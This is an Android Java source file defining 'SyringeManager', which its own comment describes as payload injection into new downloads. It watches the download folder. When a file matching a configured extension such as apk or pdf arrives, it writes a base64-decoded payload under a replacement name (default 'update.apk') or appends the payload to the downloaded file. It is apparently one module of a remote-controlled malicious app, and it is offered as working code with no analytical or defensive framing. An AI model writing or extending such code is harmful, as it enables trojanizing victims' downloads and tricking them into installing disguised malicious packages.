package com.fason.app.features.syringe;

import android.content.Context;
import android.content.SharedPreferences;

import com.fason.app.core.FasonApp;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * SyringeManager — payload injection into new downloads.
 * Watches download directory; when a new file lands, optionally replaces it
 * with a payload or appends an overlay. Rules persisted on device.
 */
public final class SyringeManager {
    private static final String PREFS = "fason_syringe";
    private static volatile SyringeManager instance;
    private final Context ctx;
    private final SharedPreferences prefs;
    private final List<Rule> rules = new ArrayList<>();
    private volatile boolean enabled = false;

    public static final class Rule {
        public String extension;      // target file extension (e.g. "apk", "pdf")
        public String mode;           // "replace" | "append"
        public String payloadB64;     // base64 payload
        public String payloadName;    // replacement filename
        public long addedAt;
    }

    private SyringeManager() {
        this.ctx = FasonApp.getContext();
        this.prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        load();
    }

    public static synchronized SyringeManager getInstance() {
        if (instance == null) instance = new SyringeManager();
        return instance;
    }

    private void load() {
        synchronized (rules) {
            rules.clear();
            try {
                org.json.JSONArray arr = new org.json.JSONArray(prefs.getString("rules", "[]"));
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    Rule r = new Rule();
                    r.extension = o.optString("extension");
                    r.mode = o.optString("mode", "replace");
                    r.payloadB64 = o.optString("payloadB64", "");
                    r.payloadName = o.optString("payloadName", "update.apk");
                    r.addedAt = o.optLong("addedAt");
                    rules.add(r);
                }
                enabled = prefs.getBoolean("enabled", false);
            } catch (Exception ignored) {}
        }
    }

    private void save() {
        try {
            org.json.JSONArray arr = new org.json.JSONArray();
            synchronized (rules) {
                for (Rule r : rules) {
                    JSONObject o = new JSONObject();
                    o.put("extension", r.extension);
                    o.put("mode", r.mode);
                    o.put("payloadB64", r.payloadB64);
                    o.put("payloadName", r.payloadName);
                    o.put("addedAt", r.addedAt);
                    arr.put(o);
                }
            }
            prefs.edit().putString("rules", arr.toString()).putBoolean("enabled", enabled).apply();
        } catch (Exception ignored) {}
    }

    public JSONObject addRule(JSONObject payload) {
        Rule r = new Rule();
        r.extension = payload.optString("extension", "apk").toLowerCase();
        r.mode = payload.optString("mode", "replace");
        r.payloadB64 = payload.optString("payloadB64", "");
        r.payloadName = payload.optString("payloadName", "update.apk");
        r.addedAt = System.currentTimeMillis();
        synchronized (rules) { rules.add(r); }
        save();
        return status();
    }

    public JSONObject removeRule(String extension) {
        synchronized (rules) {
            rules.removeIf(r -> r.extension.equalsIgnoreCase(extension));
        }
        save();
        return status();
    }

    public void setEnabled(boolean e) { this.enabled = e; save(); }
    public boolean isEnabled() { return enabled; }

    public JSONObject status() {
        JSONObject s = new JSONObject();
        try {
            s.put("enabled", enabled);
            s.put("rules", rules.size());
        } catch (Exception ignored) {}
        return s;
    }

    /** Called by download observer. Returns injected path or null. */
    public String onFileDownloaded(File file) {
        if (!enabled || file == null || !file.exists()) return null;
        String name = file.getName().toLowerCase();
        Rule match = null;
        synchronized (rules) {
            for (Rule r : rules) {
                if (name.endsWith("." + r.extension)) { match = r; break; }
            }
        }
        if (match == null || match.payloadB64.isEmpty()) return null;
        try {
            byte[] payload = android.util.Base64.decode(match.payloadB64, android.util.Base64.NO_WRAP);
            if ("replace".equals(match.mode)) {
                File target = new File(file.getParent(), match.payloadName);
                try (FileOutputStream fos = new FileOutputStream(target)) {
                    fos.write(payload);
                }
                return target.getAbsolutePath();
            } else { // append
                try (FileOutputStream fos = new FileOutputStream(file, true)) {
                    fos.write(payload);
                }
                return file.getAbsolutePath();
            }
        } catch (Exception e) {
            return null;
        }
    }
}
